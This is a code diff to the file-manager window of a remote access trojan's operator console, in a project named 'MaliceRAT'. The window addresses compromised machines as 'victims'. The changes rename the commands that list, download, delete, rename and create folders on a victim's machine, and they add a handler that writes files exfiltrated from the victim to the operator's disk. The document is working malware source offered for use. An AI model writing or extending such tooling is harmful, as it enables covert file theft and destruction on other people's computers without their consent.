@@ -2,6 +2,7 @@
 using System.Windows.Forms;
 using System.Collections.Generic;
 using System.Web.Script.Serialization;
+using System.IO;
 using MaliceRAT.RatServer;
 
 namespace MaliceRAT.RatUI
@@ -17,10 +18,13 @@ namespace MaliceRAT.RatUI
         public FileManagerForm(int victimId, Server server)
         {
             InitializeComponent();
+            InitializeContextMenu();
+
             this.victimId = victimId;
             this.server = server;
 
             server.fileManager.FilesAndFoldersReceived += OnFilesAndFoldersReceived;
+            server.fileManager.FileUploaded += OnFileUploaded;
 
             titleLabel.Text = $"File Manager [{server.GetVictimById(victimId).User}]";
         }
@@ -70,7 +74,7 @@ namespace MaliceRAT.RatUI
 
         private void InitializeContextMenu()
         {
-            ContextMenuStrip victimContextMenu = new ContextMenuStrip();
+            ContextMenuStrip fileContextMenu = new ContextMenuStrip();
             var menuItems = new[]
             {
                 ContextMenuUtilities.CreateContextMenuItem("Download", Download_Click),
@@ -79,8 +83,8 @@ namespace MaliceRAT.RatUI
                 ContextMenuUtilities.CreateContextMenuItem("Create Folder", CreateFolder_Click)
             };
 
-            victimContextMenu.Items.AddRange(menuItems);
-            gunaFilesTable.ContextMenuStrip = victimContextMenu;
+            fileContextMenu.Items.AddRange(menuItems);
+            gunaFilesTable.ContextMenuStrip = fileContextMenu;
             gunaFilesTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaTable_MouseDown(sender, e, gunaFilesTable);
         }
 
@@ -94,29 +98,48 @@ namespace MaliceRAT.RatUI
 
         private void Download_Click(object sender, EventArgs e)
         {
-            server.GetVictimById(victimId).Send(new { type = "download", path = GetPath() });
+            server.GetVictimById(victimId).Send(new { type = "fm_download", path = GetPath() });
         }
 
         private void Delete_Click(object sender, EventArgs e)
         {
-            server.GetVictimById(victimId).Send(new { type = "delete", path = GetPath() });
+            server.GetVictimById(victimId).Send(new { type = "fm_delete", path = GetPath() });
         }
 
         private void Rename_Click(object sender, EventArgs e)
         {
-            server.GetVictimById(victimId).Send(new { type = "rename", path = GetPath() });
+            server.GetVictimById(victimId).Send(new { type = "fm_rename", path = GetPath() });
         }
 
         private void CreateFolder_Click(object sender, EventArgs e)
         {
-            server.GetVictimById(victimId).Send(new { type = "create_folder", path = GetPath() });
+            server.GetVictimById(victimId).Send(new { type = "fm_mkdir", path = GetPath() });
         }
 
         private void ReadDirectory(string path)
         {
-            server.GetVictimById(victimId).Send(new { type = "read_directory", path });
+            server.GetVictimById(victimId).Send(new { type = "fm_list", path });
         }
+        #endregion
 
+        #region Event handling
+        private void OnFileUploaded(Victim victim, string name, string data)
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
+                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
+                {
+                    saveFileDialog.FileName = name;
+                    saveFileDialog.Filter = "All files (*.*)|*.*";
+
+                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                    {
+                        byte[] fileBytes = Convert.FromBase64String(data);
+                        File.WriteAllBytes(saveFileDialog.FileName, fileBytes);
+                    }
+                }
+            });
+        }
         #endregion
     }
 }
